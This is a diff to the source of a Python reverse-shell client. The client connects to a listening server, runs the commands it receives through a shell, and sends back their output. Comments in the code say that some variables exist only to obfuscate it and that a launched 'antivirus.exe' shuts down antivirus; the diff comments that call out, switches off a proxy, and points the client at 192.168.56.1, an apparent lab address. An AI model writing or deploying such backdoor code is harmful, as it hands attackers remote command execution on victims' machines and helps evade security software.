@@ -5,20 +5,21 @@ import subprocess
 import socks
 
 #Set the IP and the port of the listening server
-target_host = "127.0.0.1" 
+target_host = "192.168.56.1" 
 target_port = 443
 #This variable and the cycle for present in the code are unnecessary, are used only to obfuscate the code
 socketON = 0
 connectON = 0
 closeON = 0
 
-subprocess.call("antivirus.exe") #we launch the exe file that shut down the antivirus.
+#subprocess.call("antivirus.exe") #we launch the exe file that shut down the antivirus.
 
 for n in range(100):
     if socketON == 0:
-        #client = socket.socket(socket.AF_INET,socket.SOCK_STREAM) #If there is not a proxy uncomment this part. 
-        client = socks.socksocket(socket.AF_INET,socket.SOCK_STREAM) #if there is a proxy server, must be configured.
-        client.set_proxy(socks.HTTP, "localhost", 3128)
+        client = socket.socket(socket.AF_INET,socket.SOCK_STREAM) #If there is not a proxy uncomment this part. 
+        #client = socks.socksocket(socket.AF_INET,socket.SOCK_STREAM) #if there is a proxy server, must be configured.
+        #client.set_proxy(socks.HTTP, "localhost", 3128)
+     
         print("Socket created")
         socketON = 1
 
@@ -41,7 +42,7 @@ while True:
         for n in range(1000):
             cmd = subprocess.Popen(data[:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE )
             output_bytes = cmd.stdout.read()
-            output_str = str(output_bytes, "utf-8")
+            output_str = str(output_bytes, "ISO-8859-1")
             client.send(str.encode(output_str + str(os.getcwd()) + '$'))
             break
         #print(output_str)  
